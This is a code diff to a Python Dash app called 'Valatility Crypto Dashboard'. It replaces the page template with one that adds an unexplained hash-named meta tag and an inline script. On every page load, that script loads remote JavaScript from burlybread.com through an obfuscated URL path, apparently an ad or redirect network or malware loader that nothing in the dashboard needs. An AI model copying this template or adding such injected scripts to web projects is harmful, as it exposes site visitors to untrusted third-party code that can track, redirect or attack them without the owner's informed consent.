@@ -13,6 +13,38 @@ app = Dash(__name__)
 server = app.server
 app.title = "Valatility Crypto Dashboard"
 
+app.index_string = '''
+<!DOCTYPE html>
+<html>
+    <head>
+        {%metas%}
+        <meta name="c0eb82d8c86ce702816e259a5bc9355a7a588f4e" content="c0eb82d8c86ce702816e259a5bc9355a7a588f4e" />
+        <title>{%title%}</title>
+        {%favicon%}
+        {%css%}
+    </head>
+    <body>
+        {%app_entry%}
+        <footer>
+            {%config%}
+            {%scripts%}
+            {%renderer%}
+        </footer>
+<script>
+(function(__htavim){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = __htavim || {};
+s.src = "\/\/burlybread.com\/d\/mGF.zDdxGGlTtWP\/3kp_v_bDmGVXJOZ\/DW0e1cMOz\/QQ4FO\/DAgkzyLQTUU\/zNNpDxgl4rOyDgQ-";
+s.async = true;
+l.parentNode.insertBefore(s, l);
+})()
+</script>
+</body>
+</html>
+'''
+
 cache = Cache(
     app.server,
     config={
